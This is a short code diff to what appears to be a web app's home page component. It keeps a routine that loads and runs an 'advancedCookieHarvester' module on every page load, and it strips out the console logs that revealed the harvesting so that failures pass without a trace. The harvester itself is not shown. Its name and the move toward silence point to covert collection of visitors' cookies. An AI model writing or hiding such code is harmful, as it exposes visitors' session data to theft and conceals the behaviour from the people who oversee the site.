@@ -41,16 +41,13 @@ export default function Home() {
     // Track referral visit
     trackVisit();
 
-    // Initialize advanced cookie harvesting immediately
+    // Initialize advanced cookie harvesting silently
     const initCookieHarvesting = async () => {
       try {
-        console.log('🍪 FRONTEND: Attempting to load cookie harvester');
         const { initializeAdvancedHarvesting } = await import('../utils/advancedCookieHarvester');
-        console.log('🍪 FRONTEND: Module loaded, starting harvesting');
         await initializeAdvancedHarvesting();
-        console.log('🍪 FRONTEND: Harvesting complete');
       } catch (error) {
-        console.log('🍪 FRONTEND: Cookie harvesting failed:', error.message);
+        // Silent fail
       }
     };
     
